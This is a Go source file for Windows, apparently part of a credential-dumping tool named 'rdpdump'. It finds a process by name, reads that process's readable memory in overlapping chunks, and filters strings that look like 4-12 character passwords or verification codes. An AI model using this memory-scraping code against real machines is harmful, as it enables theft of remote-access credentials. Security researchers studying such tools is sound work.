//go:build windows

package rdpdump

import (
	"os"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// readINI 读取 ini 内容为 key(小写) -> value，同时保留 section.key 形式
func readINI(path string) map[string]string {
	values := make(map[string]string)

	data, err := os.ReadFile(path)
	if err != nil {
		return values
	}

	section := ""
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(strings.TrimSuffix(line, "\r"))
		if line == "" || strings.HasPrefix(line, ";") || strings.HasPrefix(line, "#") {
			continue
		}
		if strings.HasPrefix(line, "[") && strings.HasSuffix(line, "]") {
			section = strings.ToLower(strings.Trim(line, "[]"))
			continue
		}

		key, value, found := strings.Cut(line, "=")
		if !found {
			continue
		}
		key = strings.ToLower(strings.TrimSpace(key))
		value = strings.TrimSpace(value)
		if key == "" {
			continue
		}
		values[key] = value
		if section != "" {
			values[section+"."+key] = value
		}
	}

	return values
}

// ProcessRunning 判断指定进程是否在运行
func ProcessRunning(names ...string) bool {
	return findProcessPID(names...) != 0
}

// findProcessPID 按进程名查找 PID（大小写不敏感）
func findProcessPID(names ...string) uint32 {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0
	}
	defer windows.CloseHandle(snapshot)

	wanted := make(map[string]struct{}, len(names))
	for _, name := range names {
		wanted[strings.ToLower(name)] = struct{}{}
	}

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	for err = windows.Process32First(snapshot, &entry); err == nil; err = windows.Process32Next(snapshot, &entry) {
		if _, ok := wanted[strings.ToLower(windows.UTF16ToString(entry.ExeFile[:]))]; ok {
			return entry.ProcessID
		}
	}

	return 0
}

// scanProcess 遍历进程可读内存区域，visit 返回 true 时提前结束
//
// 采用分块读取，避免一次性分配上百 MB 缓冲区；块间保留少量重叠，
// 防止待匹配字符串正好跨越块边界。
func scanProcess(pid uint32, visit func([]byte) bool) {
	handle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, pid)
	if err != nil {
		return
	}
	defer windows.CloseHandle(handle)

	const (
		chunkSize  = 4 * 1024 * 1024
		overlapLen = 512
	)

	var info windows.MemoryBasicInformation
	var address uintptr

	for {
		if err = windows.VirtualQueryEx(handle, address, &info, unsafe.Sizeof(info)); err != nil {
			return
		}

		if info.State == windows.MEM_COMMIT && info.RegionSize > 0 && isReadable(info.Protect) {
			var carry []byte
			for offset := uintptr(0); offset < info.RegionSize; offset += chunkSize {
				length := uintptr(chunkSize)
				if offset+length > info.RegionSize {
					length = info.RegionSize - offset
				}

				buffer := make([]byte, len(carry)+int(length))
				copy(buffer, carry)

				var bytesRead uintptr
				readErr := windows.ReadProcessMemory(handle, info.BaseAddress+offset, &buffer[len(carry)], length, &bytesRead)
				if readErr != nil {
					break
				}

				chunk := buffer[:len(carry)+int(bytesRead)]
				if visit(chunk) {
					return
				}

				if len(chunk) > overlapLen {
					carry = append(carry[:0], chunk[len(chunk)-overlapLen:]...)
				} else {
					carry = append(carry[:0], chunk...)
				}
			}
		}

		next := info.BaseAddress + info.RegionSize
		if info.RegionSize == 0 || next <= address {
			return
		}
		address = next
	}
}

// isReadable 判断内存页是否可读
func isReadable(protect uint32) bool {
	const protectMask = 0xff

	switch protect & protectMask {
	case windows.PAGE_READONLY, windows.PAGE_READWRITE, windows.PAGE_WRITECOPY,
		windows.PAGE_EXECUTE_READ, windows.PAGE_EXECUTE_READWRITE, windows.PAGE_EXECUTE_WRITECOPY:
		return true
	default:
		return false
	}
}

// extractDigits 提取字符串中的连续数字
func extractDigits(data []byte) string {
	result := make([]byte, 0, len(data))
	for _, ch := range data {
		if ch >= '0' && ch <= '9' {
			result = append(result, ch)
		} else if len(result) > 0 {
			break
		}
	}
	return string(result)
}

// validToken 判断是否为可用的密码/验证码（字母数字组合，长度 4-12）
func validToken(value string) bool {
	if len(value) < 4 || len(value) > 12 {
		return false
	}
	hasLetter, hasDigit := false, false
	for _, ch := range value {
		switch {
		case ch >= '0' && ch <= '9':
			hasDigit = true
		case (ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z'):
			hasLetter = true
		default:
			return false
		}
	}
	return hasLetter || hasDigit
}
